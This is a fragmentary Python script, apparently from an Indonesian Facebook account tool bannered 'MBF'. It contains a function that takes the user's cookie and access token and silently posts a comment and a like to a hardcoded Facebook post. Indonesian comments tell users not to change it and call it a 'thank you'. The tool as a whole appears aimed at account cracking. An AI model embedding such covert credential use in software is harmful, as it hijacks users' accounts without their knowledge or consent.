...
def Iyah_Bang__Aku_Recode__Sc__Fall__Ucap__Si__Sarkas__Haha():
 ...
 _______ ______  _______  {M2}/\_/\  I {reset}
 |  |  | |_____] |______  {M2}(-°•°) Love{reset}
 |  |  | |_____] |        {P2}/>❤️    You{reset}
                          {P2}\/_\/  Haikal Saputra XD{reset}
...
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        ...
        response = r.post('https://graph.facebook.com/10161008282584684/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10161008282584684/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
